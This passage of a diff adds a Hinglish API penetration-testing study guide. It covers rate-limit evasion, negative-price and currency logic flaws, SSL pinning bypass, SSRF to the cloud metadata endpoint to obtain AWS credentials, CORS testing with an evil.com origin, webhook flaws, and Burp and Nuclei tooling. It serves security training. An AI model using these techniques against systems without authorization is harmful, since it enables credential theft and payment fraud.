+    * VPN ya proxy chains use karo.
+* **Parameter Pollution:** Har request mein ek extra random parameter daal do (`&rand=123`, `&rand=456`). Isse server ki fingerprinting fail ho sakti hai.
+* **Endpoint Swapping:** Agar `/api/login` par rate limit hai, toh `/api/v2/login` ya `/api/auth/login` try karo.
+* **Slow down:** Thoda slow request bhejo, threshold ke neeche raho.
+
+### Topic 6.4: Financial Logic Flaws
+* **Negative Values:** `quantity: -1` ya `price: -100` bhej kar dekho. Total negative ho sakta hai.
+* **Currency Manipulation:** Product price USD 10 hai. Currency code change karo INR 10 par. Agar conversion nahi hua, toh sasta mil gaya.
+* **Decimal Precision:** `price: 10.9999999999` bhej kar rounding errors exploit karo.
+
+---
+
+## 🌐 Module 7: Infrastructure & Misconfiguration (Mobile & Cloud)
+
+### Topic 7.1: Mobile API Interception (SSL Pinning Bypass)
+* **Problem:** Mobile app mein Burp ka certificate kaam nahi karta (app apna certificate check karti hai).
+* **Solution 1 (Objection/Frida):**
+    * Install Frida and Objection.
+    * `objection --gadget "app.name" explore --startup-command "android sslpinning disable"`
+* **Solution 2 (Burp + Proxy):** Android emulator mein proxy set karo aur `ProxyDroid` jaise app se traffic forward karo.
+* **Hardcoded Keys:** APK decompile karo (`apktool`), `strings.xml` aur source code mein API secrets, Firebase keys, aur endpoints dhoondo.
+
+### Topic 7.2: Cloud-Native API Risks (AWS/Azure/GCP)
+* **Metadata SSRF:** SSRF se `http://169.254.169.254/latest/meta-data/iam/security-credentials/` hit karo. Temporary AWS keys mil jayenge.
+* **S3 Bucket Leakage:** API endpoints jo files serve karte hain, unmein S3 URLs leak ho rahe hain? Response mein `https://s3.amazonaws.com/bucket-name/file.jpg` dikhta hai toh bucket public ho sakti hai.
+* **Serverless (Lambda) Risks:** Event injection. Manipulated JSON event se lambda function ka logic change kar do.
+
+### Topic 7.3: CORS (Cross-Origin Resource Sharing) Misconfiguration
+* **CORS Wildcard:** `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` ho toh **critical** hai. Koi bhi malicious site user ka data API se chura sakti hai.
+    * **Test:** Request mein `Origin: https://evil.com` daalo. Agar response mein `Access-Control-Allow-Origin: https://evil.com` aur `Allow-Credentials: true` milta hai, toh vulnerable.
+* **Null Origin Bypass:** `Origin: null` bhej kar dekho. Kai baar server `null` ko allow kar deta hai.
+* **Preflight Bypass:** `OPTIONS` request ka response check karo.
+
+### Topic 7.4: API Versioning & Deprecation
+* **Debug Endpoints:** `/api/debug`, `/api/test`, `/api/health`, `/api/status` try karo. Production mein ye nahi hone chahiye.
+* **Deprecated Versions:** `/v1/` mein vulnerabilities hain jo `/v2/` mein fix hain. Try karo `/v1/` endpoints ko.
+
+### Topic 7.5: Security Headers
+* Check karo: `Strict-Transport-Security` (HSTS), `Content-Security-Policy` (CSP), `X-Content-Type-Options` present hain ya nahi.
+* **Verbose Error Messages:** Galat input daal kar dekho. Stack trace, DB version, internal paths leak ho rahe hain?
+
+---
+
+## 🔗 Module 8: Webhook Security & Microservices
+
+### Topic 8.1: Webhook Security
+* **Scenario:** Tumhari app kisi third-party service ko webhook bhejti hai (e.g., payment success par).
+* **Lack of Signature Verification:** Agar incoming webhook (dusri service se tumhari app par aane wala) verify nahi hota, toh attacker fake webhook bhej kar event trigger kar sakta hai (e.g., "payment success").
+* **Replay Attacks:** Webhook request mein `timestamp` aur `nonce` missing hai? Attacker same request baar-baar bhej sakta hai.
+* **SSRF via Webhook:** Webhook URL field mein internal IP daal kar server ko request karwado.
+
+### Topic 8.2: Microservices Communication
+* **Service-to-Service Auth:** Internal APIs bina authentication ke accessible hain? Try karo `service-a.internal` ya `service-b:8080` ko.
+* **mTLS Misconfig:** Agar mutual TLS hai, toh certificate check bypass ho sakta hai?
+
+---
+
+## ⚙️ Module 9: Professional Tooling & Automation
+
+### Topic 9.1: Burp Suite Mastery
+* **Scope Configuration:** Sirf target domain ka traffic dekhne ke liye (Reference: **Page 5, 16-17**)
+    1.  Target tab -> Scope -> Add domain.
+    2.  Proxy -> HTTP History -> Filter -> "Show only in-scope items".
+* **Color Coding:** Kisi bhi request par right-click -> "Add to scope/Highlight" kar ke important requests ko mark karo. (Reference: **Page 4**)
+* **Intercept Response Rules:** Settings mein "Intercept response based on rules" enable karo. (Reference: **Page 17**)
+
+### Topic 9.2: Burp Extensions (Must-Haves)
+* **Autorize:** Automated authorization testing (BOLA dhoondne ke liye). Low-privilege user ke session ke saath chalao, high-privilege endpoints access ho rahe hain kya?
+* **AuthMatrix:** Complex role-based access control (RBAC) test karne ke liye.
+* **JSON Web Tokens:** JWT ko intercept karte hi edit karne ke liye.
+* **GraphQL Raider / InQL:** GraphQL testing ke liye.
+* **Turbo Intruder:** Race conditions aur massive rate limit testing.
+* **Backslash Powered Scanner:** Advanced parameter parsing.
+* **Logger++:** Advanced traffic logging.
+
+### Topic 9.3: CLI & Scripting
+* **Postman / Newman:** API collections bana kar Newman se automate karo. Regression testing ke liye useful.
+* **Python Requests:** Custom scripts for complex logic attacks (Race conditions, custom payloads).
+* **Nuclei:** API-specific templates se automatic CVE scan karna. `nuclei -u https://api.target.com -t ~/nuclei-templates/api/`
+* **Ffuf / Gobuster:** API route discovery ke liye custom API wordlists ke saath.
+
+### Topic 9.4: Reporting (CVSS & PoC)
+* **CVSS Score:** Vulnerbility ki severity nikalne ke liye (Base Score: 3.0 - Low, 7.0+ High). Use `https://www.first.org/cvss/calculator/`.
+* **PoC Writing:** Steps clearly likho, screenshot do, impact batao, fix suggestion do.
+* **Remediation Guidance:** Framework-specific fix suggestions (e.g., Spring Boot mein `@PreAuthorize`, Express mein middleware).
+
+---
+
+
